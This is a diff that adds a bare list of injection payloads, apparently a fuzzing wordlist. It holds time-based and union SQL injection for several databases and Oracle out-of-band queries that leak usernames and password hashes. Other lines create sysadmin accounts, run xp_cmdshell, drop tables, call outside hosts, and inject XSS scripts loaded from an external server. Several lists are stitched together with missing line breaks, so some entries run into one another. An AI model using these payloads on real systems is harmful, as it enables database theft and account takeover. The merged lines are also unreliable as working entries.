@@ -1,0 +1,559 @@
+sleep(05)#
+1 or sleep(05)#
+" or sleep(05)#
+' or sleep(05)#
+" or sleep(05)="
+' or sleep(05)='
+1) or sleep(05)#
+") or sleep(05)="
+') or sleep(05)='
+1)) or sleep(05)#
+")) or sleep(05)="
+')) or sleep(05)='
+;waitfor delay '0:0:05'-- 
+);waitfor delay '0:0:05'-- 
+';waitfor delay '0:0:05'-- 
+";waitfor delay '0:0:05'-- 
+');waitfor delay '0:0:05'-- 
+");waitfor delay '0:0:05'-- 
+));waitfor delay '0:0:05'-- 
+'));waitfor delay '0:0:05'-- 
+"));waitfor delay '0:0:05'-- 
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(05)-- 
+1 or pg_sleep(05)-- 
+" or pg_sleep(05)-- 
+' or pg_sleep(05)-- 
+1) or pg_sleep(05)--  
+") or pg_sleep(05)-- 
+') or pg_sleep(05)-- 
+1)) or pg_sleep(05)-- 
+")) or pg_sleep(05)-- 
+')) or pg_sleep(05)-- 1
+1 and user_name() = 'dbo'
+\'; desc users; --
+1\'1
+1' and non_existant_table = '1
+' or username is not NULL or username = '
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+1 uni/**/on select all from where!'
+!@#$%%^#$%#$@#$%$$@#$%^^**(()
+!@#0%^#0##018387@#0^^**(()
+"><script>"
+">xxx<P>yyy
+"\t"
+#
+#&apos;
+#'
+#xA
+#xA#xD
+#xD
+#xD#xA
+$NULL
+$null
+%
+%00
+%00/
+%01%02%03%04%0a%0d%0aADSF
+%0a
+%20
+%20|
+%2500
+%250a
+%2A
+%2C
+%2e%2e%2f
+%3C%3F
+%5C
+%5C/
+%60
+%7C
+&#10;
+&#10;&#13;
+&#13;
+&#13;&#10;
+&apos;
+&quot;;id&quot;
+(')
+*
+*&apos;
+*'
+*|
++%00
+-
+--
+-1
+-1.0
+-2
+-20
+-268435455
+..%%35%63
+..%%35c
+..%25%35%63
+..%255c
+..%5c
+..%bg%qf
+..%c0%af
+..%u2215
+..%u2216
+../
+..\
+/
+/%00/
+/%2A
+/&apos;
+/'
+0
+00
+0xfffffff
+1
+1.0
+2
+2147483647
+268435455
+65536
+;
+<  script > < / script>
+<?
+?x=
+?x="
+?x=>
+?x=|
+@&apos;
+@'
+A
+ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+FALSE
+NULL
+TRUE
+[&apos;]
+[']
+\
+\"blah
+\&apos;
+\'
+\0
+\00
+\00\00
+\00\00\00
+\0\0
+\0\0\0
+\\
+\\/
+\\\\*
+\\\\?\\
+\t
+^&apos;
+^'
+`
+id%00
+id%00|
+null
+something%00html
+{&apos;}
+{'}
+|
+}'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:5' -- 
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:5' -- 
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:5' -- 
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:5' -- 
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:5' -- 
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:5' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:5' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:5' -- '; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'create user name identified by 'pass123' --
+'create user name identified by pass123 temporary tablespace temp default tablespace users; 
+' ; drop table temp --
+'exec sp_addlogin 'name' , 'password' --
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --
+' grant connect to name; grant resource to name; --
+' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+' or 1=1 --
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --1'1
+1 exec sp_ (or exec xp_)
+1 and 1=1
+1' and 1=(select count(*) from tablenames); --
+1 or 1=1
+1' or '1'='1’ or ‘1’=’1
+' or '1'='1
+'||utl_http.request('httP://192.168.1.1/')||'
+' || myappadmin.adduser('admin', 'newpass') || '
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i OR 1=1
+ OR 1=2
+ OR 1=1 -- 
+ OR 1=2 --  
+ OR 1=1 #
+ OR 1=2 # 
+ OR 1=1 /*
+ OR 1=2 /* 
+) OR 1=1
+) OR 1=2
+) OR 1=1 -- 
+) OR 1=2 -- 
+') OR 1=1 #
+') OR 1=2 #
+') OR 1=1 /*1 or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or 1=1
+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)
+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6) as test
+9999' or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or '0'='9999
+9999" or (select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)=0 or "0"="9999
+9999'+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+'9999
+9999"+(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)+"9999
+9999'||(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||'9999
+9999"||(select count(*) from INFORMATION_SCHEMA.tables as sys1,INFORMATION_SCHEMA.tables as sys2,INFORMATION_SCHEMA.tables as sys3,INFORMATION_SCHEMA.tables as sys4,INFORMATION_SCHEMA.tables as sys5,INFORMATION_SCHEMA.tables as sys6)||"9999
+(select like('abcdefg',upper(hex(randomblob(150000000))))) as test
+(select like('abcdefg',upper(hex(randomblob(150000000)))))
+9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999
+9999"||(select like('abcdefg',upper(hex(randomblob(150000000)))))||"9999
+(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) as test
+(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+9999'||(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'9999
+9999"||(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||"9999
+(select benchmark(15000000,md5(0x4e446b6e))-9999) as test
+benchmark(15000000,md5(0x4e446b6e))-9999
+9999' or benchmark(15000000,md5(0x4e446b6e)) or '0'='9999
+9999" or benchmark(15000000,md5(0x4e446b6e)) or "0"="9999
+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) as test
+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+9999'+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+'9999
+9999"+(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)+"9999
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) as test
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+9999'||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'9999
+9999"||(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||"9999
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3) as test
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)
+9999'||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||'9999
+9999"||(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)||"9999
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) as test
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+9999'||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||'9999
+9999"||(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)||"9999
+(select 99999999 from pg_sleep(15)) as test
+(select 99999999 from pg_sleep(15))
+9999'||(select 99999999 from pg_sleep(15))||'9999
+9999"||(select 99999999 from pg_sleep(15))||"9999sleep(05)#
+1 or sleep(05)#
+" or sleep(05)#
+' or sleep(05)#
+" or sleep(05)="
+' or sleep(05)='
+1) or sleep(05)#
+") or sleep(05)="
+') or sleep(05)='
+1)) or sleep(05)#
+")) or sleep(05)="
+')) or sleep(05)='
+1 and sleep(05)#
+" and sleep(05)#
+' and sleep(05)#
+" and sleep(05)="
+' and sleep(05)='
+1) and sleep(05)#
+") and sleep(05)="
+') and sleep(05)='
+1)) and sleep(05)#
+")) and sleep(05)="
+')) and sleep(05)='
+;waitfor delay '0:0:05'-- 
+);waitfor delay '0:0:05'-- 
+';waitfor delay '0:0:05'-- 
+";waitfor delay '0:0:05'-- 
+');waitfor delay '0:0:05'-- 
+");waitfor delay '0:0:05'-- 
+));waitfor delay '0:0:05'-- 
+'));waitfor delay '0:0:05'-- 
+"));waitfor delay '0:0:05'-- 
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(05)-- 
+1 or pg_sleep(05)-- 
+" or pg_sleep(05)-- 
+' or pg_sleep(05)-- 
+1) or pg_sleep(05)-- 
+") or pg_sleep(05)-- 
+') or pg_sleep(05)-- 
+1)) or pg_sleep(05)-- 
+")) or pg_sleep(05)-- 
+')) or pg_sleep(05)-- 
+1 and pg_sleep(05)-- 
+" and pg_sleep(05)-- 
+' and pg_sleep(05)-- 
+1) and pg_sleep(05)-- 
+") and pg_sleep(05)-- 
+') and pg_sleep(05)-- 
+1)) and pg_sleep(05)-- 
+")) and pg_sleep(05)-- 
+')) and pg_sleep(05)-- 
+1\tor\tsleep(05)#
+"\tor\tsleep(05)#
+'\tor\tsleep(05)#
+"\tor\tsleep(05)="
+'\tor\tsleep(05)='
+1)\tor\tsleep(05)#
+")\tor\tsleep(05)="
+')\tor\tsleep(05)='
+1))\tor\tsleep(05)#
+"))\tor\tsleep(05)="
+'))\tor\tsleep(05)='
+1\tand\tsleep(05)#
+"\tand\tsleep(05)#
+'\tand\tsleep(05)#
+"\tand\tsleep(05)="
+'\tand\tsleep(05)='
+1)\tand\tsleep(05)#
+")\tand\tsleep(05)="
+')\tand\tsleep(05)='
+1))\tand\tsleep(05)#
+"))\tand\tsleep(05)="
+'))\tand\tsleep(05)='
+;waitfor\tdelay\t'0:0:05'-- 
+);waitfor\tdelay\t'0:0:05'-- 
+';waitfor\tdelay\t'0:0:05'-- 
+";waitfor\tdelay\t'0:0:05'-- 
+');waitfor\tdelay\t'0:0:05'-- 
+");waitfor\tdelay\t'0:0:05'-- 
+));waitfor\tdelay\t'0:0:05'-- 
+'));waitfor\tdelay\t'0:0:05'-- 
+"));waitfor\tdelay\t'0:0:05'-- 
+1\tor\tbenchmark(10000000,MD5(1))#
+"\tor\tbenchmark(10000000,MD5(1))#
+'\tor\tbenchmark(10000000,MD5(1))#
+1)\tor\tbenchmark(10000000,MD5(1))#
+")\tor\tbenchmark(10000000,MD5(1))#
+')\tor\tbenchmark(10000000,MD5(1))#
+1))\tor\tbenchmark(10000000,MD5(1))#
+"))\tor\tbenchmark(10000000,MD5(1))#
+'))\tor\tbenchmark(10000000,MD5(1))#
+1\tor\tpg_sleep(05)-- 
+"\tor\tpg_sleep(05)-- 
+'\tor\tpg_sleep(05)-- 
+1)\tor\tpg_sleep(05)-- 
+")\tor\tpg_sleep(05)-- 
+')\tor\tpg_sleep(05)-- 
+1))\tor\tpg_sleep(05)-- 
+"))\tor\tpg_sleep(05)-- 
+'))\tor\tpg_sleep(05)-- 
+1\tand\tpg_sleep(05)-- 
+"\tand\tpg_sleep(05)-- 
+'\tand\tpg_sleep(05)-- 
+1)\tand\tpg_sleep(05)-- 
+")\tand\tpg_sleep(05)-- 
+')\tand\tpg_sleep(05)-- 
+1))\tand\tpg_sleep(05)-- 
+"))\tand\tpg_sleep(05)-- 
+'))\tand\tpg_sleep(05)-- 
+1/**/or/**/sleep(05)#
+"/**/or/**/sleep(05)#
+'/**/or/**/sleep(05)#
+"/**/or/**/sleep(05)="
+'/**/or/**/sleep(05)='
+1)/**/or/**/sleep(05)#
+")/**/or/**/sleep(05)="
+')/**/or/**/sleep(05)='
+1))/**/or/**/sleep(05)#
+"))/**/or/**/sleep(05)="
+'))/**/or/**/sleep(05)='
+1/**/and/**/sleep(05)#
+"/**/and/**/sleep(05)#
+'/**/and/**/sleep(05)#
+"/**/and/**/sleep(05)="
+'/**/and/**/sleep(05)='
+1)/**/and/**/sleep(05)#
+")/**/and/**/sleep(05)="
+')/**/and/**/sleep(05)='
+1))/**/and/**/sleep(05)#
+"))/**/and/**/sleep(05)="
+'))/**/and/**/sleep(05)='
+;waitfor/**/delay/**/'0:0:05'-- 
+);waitfor/**/delay/**/'0:0:05'-- 
+';waitfor/**/delay/**/'0:0:05'-- 
+";waitfor/**/delay/**/'0:0:05'-- 
+');waitfor/**/delay/**/'0:0:05'-- 
+");waitfor/**/delay/**/'0:0:05'-- 
+));waitfor/**/delay/**/'0:0:05'-- 
+'));waitfor/**/delay/**/'0:0:05'-- 
+"));waitfor/**/delay/**/'0:0:05'-- 
+1/**/or/**/benchmark(10000000,MD5(1))#
+"/**/or/**/benchmark(10000000,MD5(1))#
+'/**/or/**/benchmark(10000000,MD5(1))#
+1)/**/or/**/benchmark(10000000,MD5(1))#
+")/**/or/**/benchmark(10000000,MD5(1))#
+')/**/or/**/benchmark(10000000,MD5(1))#
+1))/**/or/**/benchmark(10000000,MD5(1))#
+"))/**/or/**/benchmark(10000000,MD5(1))#
+'))/**/or/**/benchmark(10000000,MD5(1))#
+1/**/or/**/pg_sleep(05)-- 
+"/**/or/**/pg_sleep(05)-- 
+'/**/or/**/pg_sleep(05)-- 
+1)/**/or/**/pg_sleep(05)-- 
+")/**/or/**/pg_sleep(05)-- 
+')/**/or/**/pg_sleep(05)-- 
+1))/**/or/**/pg_sleep(05)-- 
+"))/**/or/**/pg_sleep(05)-- 
+'))/**/or/**/pg_sleep(05)-- 
+1/**/and/**/pg_sleep(05)-- 
+"/**/and/**/pg_sleep(05)-- 
+'/**/and/**/pg_sleep(05)-- 
+1)/**/and/**/pg_sleep(05)-- 
+")/**/and/**/pg_sleep(05)-- 
+')/**/and/**/pg_sleep(05)-- 
+1))/**/and/**/pg_sleep(05)-- 
+"))/**/and/**/pg_sleep(05)-- 
+'))/**/and/**/pg_sleep(05)-- 
+' and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+" and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+') and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+") and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+')) and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+")) and (SELECT * FROM [ODBC;DRIVER=SQL SERVER;Server=1.1.1.1;DATABASE=w].a.p)\0
+';d=new Date();do{cd=new Date();}while(cd-d<10000);//
+";d=new Date();do{cd=new Date();}while(cd-d<10000);//<SCRIPT>alert('XSS');</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG%0aSRC%0a=%0a"%0aj%0aa%0av%0aa%0as%0ac%0ar%0ai%0ap%0at%0a:%0aa%0al%0ae%0ar%0at%0a(%0a'%0aX%0aS%0aS%0a'%0a)%0a"%0a>
+<IMG SRC=java%00script:alert(\"XSS\")>
+<SCR%00IPT>alert(\"XSS\")</SCR%00IPT>
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
